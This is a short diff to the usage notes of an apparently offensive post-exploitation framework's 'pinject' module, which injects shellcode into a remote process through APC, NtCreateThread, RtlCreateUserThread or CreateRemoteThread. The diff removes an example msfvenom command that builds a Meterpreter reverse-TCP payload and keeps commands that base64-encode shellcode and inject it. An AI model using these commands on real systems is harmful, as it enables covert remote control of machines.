@@ -187,9 +187,7 @@ modules info pinject
 # In interactive mode, the agent ID is automatically inferred:
 pinject <shellcode_file> [agent_id=<agent_id>] [technique=auto|apc|ntcreatethread|rtlcreateuser|createremote]
 
-# Example: Generate shellcode
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f raw -o shellcode.bin
-# Base64 encode the raw shellcode and save to .b64 file before sending to the module - (preferred METHOD 1)
+# Base64 encode raw shellcode and save to .b64 file before sending to the module:
 base64 -w 0 shellcode.bin > shellcode.b64 
 
 pinject shellcode.b64 technique=auto
